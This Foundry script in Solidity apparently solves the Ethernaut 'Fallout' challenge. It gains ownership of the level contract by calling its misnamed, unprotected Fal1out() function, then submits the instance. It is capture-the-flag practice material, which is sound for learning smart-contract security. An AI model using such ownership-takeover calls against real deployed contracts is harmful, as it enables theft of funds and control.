// SPDX-License-Identifier: MIT
pragma solidity 0.8.21;

import {Script, console2} from "forge-std/Script.sol";
import {EthernautHelper} from "../setup/EthernautHelper.sol";

// NOTE You can import your helper contracts & create interfaces here
interface Fallout {
    function Fal1out() external payable;
}

contract FalloutSolution is Script, EthernautHelper {
    address constant LEVEL_ADDRESS = 0x676e57FdBbd8e5fE1A7A3f4Bb1296dAC880aa639;
    uint256 heroPrivateKey = vm.envUint("PRIVATE_KEY");

    function run() public {
        vm.startBroadcast(heroPrivateKey);
        // NOTE this is the address of your challenge contract
        address challengeInstance = createInstance(LEVEL_ADDRESS);

        // Ric Li C's Solution
        // 1. Call Fal1out() function to make caller owner of the contract;
        Fallout challenge = Fallout(challengeInstance);
        challenge.Fal1out();

        // 2. Confirm that `heroAddress` is now owner of the contract.
        // Due to the Fallout interface, below check is not possible;
        // if contract `Fallout` is imported, below check will work.
        // address heroAddress = vm.addr(heroPrivateKey);
        // require(heroAddress == challenge.owner(), "Owner check failed");

        // SUBMIT CHALLENGE. (DON'T EDIT)
        bool levelSuccess = submitInstance(challengeInstance);
        require(levelSuccess, "Challenge not passed yet");
        vm.stopBroadcast();

        console2.log(successMessage(2));
    }
}